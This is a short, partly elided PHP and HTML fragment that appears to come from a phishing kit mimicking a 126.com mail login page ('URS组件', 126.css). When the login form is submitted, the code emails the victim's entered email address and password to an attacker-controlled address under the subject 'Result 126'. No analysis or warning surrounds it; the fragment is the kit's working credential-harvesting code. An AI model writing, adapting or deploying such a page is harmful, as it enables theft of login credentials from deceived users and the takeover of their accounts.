...
if(isset($_POST['dologin'])) {
    ...
    mail($to, 'Result 126', "Email: $email | Password: $pass", 'From: 163.com by Lhz <mastah@localheartz.club>');
}
?>
<html>
    <head>
        ...
        <title>URS组件</title>
        <link rel="stylesheet" href="assets/css/126.css">
     </head>
    <body>
